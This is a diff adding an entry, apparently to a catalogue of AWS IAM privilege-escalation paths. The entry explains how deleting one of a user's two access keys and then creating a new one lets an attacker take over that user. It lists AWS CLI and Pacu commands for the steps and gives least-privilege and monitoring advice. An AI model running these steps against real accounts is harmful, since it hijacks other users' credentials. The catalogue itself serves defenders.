@@ -1,0 +1,60 @@
+id: iam-003
+name: iam:CreateAccessKey + iam:DeleteAccessKey
+category: lateral-movement
+services:
+- iam
+description: This is a variation of `iam:CreateAccessKey` that works even when the target user already has 2 access keys (the
+  AWS maximum). By combining `iam:CreateAccessKey` with `iam:DeleteAccessKey`, an attacker can first delete one of the existing
+  keys, then create a new access key for themselves, gaining access to the target user's permissions.
+prerequisites:
+  admin:
+  - Target user has 2 access keys (maximum allowed)
+  - Target user must have administrative permissions (e.g., AdministratorAccess)
+  lateral:
+  - Target user has 2 access keys (maximum allowed)
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws iam list-access-keys --user-name @username
+    description: List existing access keys for the target user
+  - step: 2
+    command: aws iam delete-access-key --user-name @username --access-key-id @access-key-id
+    description: Delete one of the existing access keys
+  - step: 3
+    command: aws iam create-access-key --user-name @username
+    description: Create a new access key for the target user
+  - step: 4
+    command: aws configure --profile target-user
+    description: Configure AWS CLI with the newly created access key
+  pacu:
+  - step: 1
+    command: run iam__create_access_key --user-name @username --delete-existing
+    description: Use Pacu to automatically delete an existing key and create a new one
+recommendation: |
+  Restrict access to both `iam:CreateAccessKey` and `iam:DeleteAccessKey` using the principle
+  of least privilege. The combination of these permissions is particularly dangerous as it
+  bypasses the 2-key limit protection. Monitor for sequences where DeleteAccessKey is
+  immediately followed by CreateAccessKey for the same user.
+discoveredBy:
+  name: Seth Art
+  organization: Datadog
+  date: '2024'
+references:
+- title: AWS IAM User Access Key Limits
+  url: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-quotas.html
+relatedPaths:
+- iam-002
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
+permissions:
+  required:
+  - permission: iam:CreateAccessKey
+    resourceConstraints: Target IAM user must be in the Resource section
+  - permission: iam:DeleteAccessKey
+    resourceConstraints: Target IAM user must be in the Resource section
+  additional:
+  - permission: iam:ListUsers
+    resourceConstraints: Helpful for discovering target users
+  - permission: iam:GetUser
+    resourceConstraints: Useful for viewing user details
